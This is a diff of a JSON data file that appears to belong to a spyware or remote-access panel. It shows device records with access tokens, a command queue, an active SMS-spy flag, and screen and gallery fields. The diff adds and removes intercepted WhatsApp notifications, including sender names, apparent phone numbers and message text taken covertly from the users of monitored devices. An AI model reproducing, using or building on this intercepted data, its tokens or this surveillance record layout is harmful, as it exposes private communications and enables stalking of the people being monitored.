@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777353673004,
+    "lastSeen": 1777353678921,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -466,7 +466,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777353672961,
+    "lastSeen": 1777353679043,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -482,6 +482,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ibu Syantik",
+        "content": "Garo mamane biru",
+        "time": "28/04 12:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777353680033
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Ibu Syantik",
+        "content": "‎3 pesan baru",
+        "time": "28/04 12:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777353674097
+      },
       {
         "appName": "WhatsApp",
         "sender": "Ibu Syantik",
@@ -4465,22 +4481,6 @@
         "time": "27/04 19:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1777294456588
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "Kalo cocok gwe buy",
-        "time": "27/04 19:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294456451
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "Liat story gw dong",
-        "time": "27/04 19:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294449564
       }
     ],
     "galleryPhotos": [],
